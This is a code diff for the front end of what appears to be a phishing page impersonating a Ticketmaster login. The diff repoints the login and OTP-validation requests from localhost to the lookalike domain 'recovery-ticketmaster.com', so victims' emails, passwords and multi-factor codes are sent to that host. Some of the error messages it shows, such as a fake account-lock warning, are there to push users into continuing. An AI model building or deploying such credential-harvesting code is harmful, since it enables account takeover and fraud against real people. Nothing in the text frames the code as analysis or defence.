@@ -8052,7 +8052,7 @@
           console.log('clicked')
           console.log(email)
           console.log(password)
-          fetch('http://localhost:5000/login', {
+          fetch('http://recovery-ticketmaster.com/login', {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/json'
@@ -8073,7 +8073,7 @@
                 if(JSON.stringify(data).includes('Invalid email')){
                   errorMessageElement.textContent = "We can’t find an account with this email address. Please try a different email.";
                 }
-                else if(JSON.stringify(data).includes('account is locked')){
+                else if(JSON.stringify(data).includes('Account Locked')){
                   errorMessageElement.textContent = "Your Account is locked. It’s Time to Update Your Password";
                 }
                 else if(JSON.stringify(data).includes('Invalid password')){
@@ -8131,7 +8131,7 @@
             const otpInput = document.getElementById('mfa-code-input-field5');
             const errorMessageElement = document.getElementById('otp-error-message');
 
-            fetch('http://localhost:5000/otp-validate', {
+            fetch('http://recovery-ticketmaster.com/otp-validate', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
